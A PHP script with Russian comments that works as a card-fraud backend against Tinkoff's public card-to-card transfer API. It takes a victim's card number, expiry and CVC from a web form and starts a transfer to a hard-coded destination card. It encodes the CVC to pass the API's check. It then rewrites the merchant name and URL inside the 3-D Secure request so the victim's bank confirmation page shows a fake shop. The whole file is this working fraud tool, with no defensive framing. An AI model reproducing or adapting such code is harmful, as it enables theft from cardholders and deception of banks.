<?php
  	date_default_timezone_set("Europe/Moscow");
	$dest_card = "";
	$card_number = str_replace(" ", "", $_POST['n']);
	$cardFromMonth =  $_POST['m'];
	$cardFromYear =  $_POST['y'];
	$cardFromCVC =  $_POST['c'];	
	$amount = "10";
	$order_id = "12345";
	// функция, отвечающая за запросы к сайту и получению массива данных.
	function post($url = null, $params = null, $proxy = null, $proxy_userpwd = null) {
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, $url);
		curl_setopt($ch, CURLOPT_HEADER, 1);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);
		if(isset($params['params'])) {
			curl_setopt($ch, CURLOPT_POST, 1);
			curl_setopt($ch, CURLOPT_POSTFIELDS, $params['params']);
		}
		if(isset($params['headers'])) {
			curl_setopt($ch, CURLOPT_HTTPHEADER, $params['headers']);
		}
		if(isset($params['cookies'])) {
			curl_setopt($ch, CURLOPT_COOKIE, $params['cookies']);
		}
		if($proxy) {
			curl_setopt($ch, CURLOPT_PROXY, $proxy);
			if($proxy_userpwd) {
				curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxy_userpwd);
			}
		}
		$result = curl_exec($ch);
		$result_explode = explode("\r\n\r\n", $result);
		$headers = ((isset($result_explode[0])) ? $result_explode[0]."\r\n" : '').''.((isset($result_explode[1])) ? $result_explode[1] : '');
		$content = $result_explode[count($result_explode) - 1];
		preg_match_all('|Set-Cookie: (.*);|U', $headers, $parse_cookies);
		$cookies = implode(';', $parse_cookies[1]);
		curl_close($ch);
		return array('headers' => $headers, 'cookies' => $cookies, 'content' => $content);
	}

	function renameShop($pareq, $to_name, $to_link){
		$defaultPareq = base64_decode($pareq);
		$ThreeDSecureData = zlib_decode($defaultPareq);
		$ThreeDSecureDataXML = new \SimpleXMLElement($ThreeDSecureData);
		foreach($ThreeDSecureDataXML->xpath('/ThreeDSecure/Message/PAReq/Merchant') as $threeData) {
			$threeData->name = $to_name;
			$threeData->url = $to_link;
		}
		$ThreeDSecureData = $ThreeDSecureDataXML->asXML();
		$ThreeDSecureData = zlib_encode($ThreeDSecureData, ZLIB_ENCODING_DEFLATE);
		$ThreeDSecureData = base64_encode($ThreeDSecureData);
		return $ThreeDSecureData;
	}

	$get_main_page = post('https://api.tinkoff.ru/v1/session?origin=web%2Cib5%2Cplatform');
	$session_id = json_decode($get_main_page['content'], true)['payload'];
	
	if (!isset($dest_card) || $dest_card == "")
		die("destination card not set");
	else {

		$a = $cardFromCVC;
		$b = rand(100,500);

		$x = (floor($a/100)+10-floor($b/100))%10;
		$y = (floor($a/10)%10+10-floor($b/10)%10)%10;
		$z = ($a%10+10-$b%10)%10;

		$secureCode = $x.$y.$z;

		$payArrForCOMM = [
			'currency' => 'RUB',
			'moneyAmount' => $amount,
			'provider' => 'c2c-anytoany',
			'cardNumber' => $card_number,
			'providerFields' => [
				'toCardNumber' => $dest_card
			]
		];

		$encPayCOMM = urlencode(json_encode($payArrForCOMM));

		$get_commission = post('https://api.tinkoff.ru/v1/payment_commission?origin=web%2Cib5%2Cplatform&sessionid='.$session_id, [
			'params' => 'payParameters='.$encPayCOMM
		]);

		$payParamsArr = [
			'cardNumber' => $card_number,
			'formProcessingTime' => $b,
			'securityCode' => $secureCode,
			'expiryDate' => $cardFromMonth.'/'.$cardFromYear,
			'attachCard' => 'false',
			'provider' => 'c2c-anytoany',
			'currency' => 'RUB',
			'moneyAmount' => $amount,
			'moneyCommission' => json_decode($get_commission['content'], true)['payload']['total']['value'],
			'providerFields' => [
				'toCardNumber' => $dest_card
			]
		];

		$encPay = urlencode(json_encode($payParamsArr));

		$payform = post('https://api.tinkoff.ru/v1/pay?origin=web%2Cib5%2Cplatform&sessionid='.$session_id, [
			'params' => 'payParameters='.$encPay
		]);

		$output = json_decode($payform['content'], true);

		if (!isset($output['plainMessage'])) {
			$tempdata = $output;
			$tempdata["amount"] = ($amount);
			$tempdata["MD"] = $output['confirmationData']['3DSecure']['merchantData'];
			file_put_contents($_SERVER['DOCUMENT_ROOT']."/temp/" . $output['confirmationData']['3DSecure']['merchantData'], json_encode($tempdata, true));
			$newpareq = renameShop($output['confirmationData']['3DSecure']['requestSecretCode'], $_POST['shopName'], $_POST['url']);

			echo '<html><head>' .
			'<script src="https://code.jquery.com/jquery-3.3.1.js"></script>' .
			'<script>$(document).ready(function(){$("#payform").submit();});</script>' .
			'</head><body style="padding: 0px; margin: 0px;">' .
			'<form action="' . $output['confirmationData']['3DSecure']['url'] . '" method="post" target="payframe" id="payform">' .
			'<input type="hidden" name="PaReq" value="' . $newpareq . '">' .
			'<input type="hidden" name="MD" value="' . $output['confirmationData']['3DSecure']['merchantData'] . '">' .
			'<input type="hidden" name="TermUrl" value="http://' . $_SERVER["SERVER_NAME"] . dirname($_SERVER["REQUEST_URI"]) . '/status.php?amount='.(int)$amount.'&order_id=' . (int)$order_id . '&session_id='.$session_id.'">' .
			'</form>' .
			'<iframe name="payframe" style="width: 100%; height: 100%; border: 0px;"></iframe>' .
			'</body></html>';
		} else {
			echo $output['plainMessage'];
		}
	}

?>
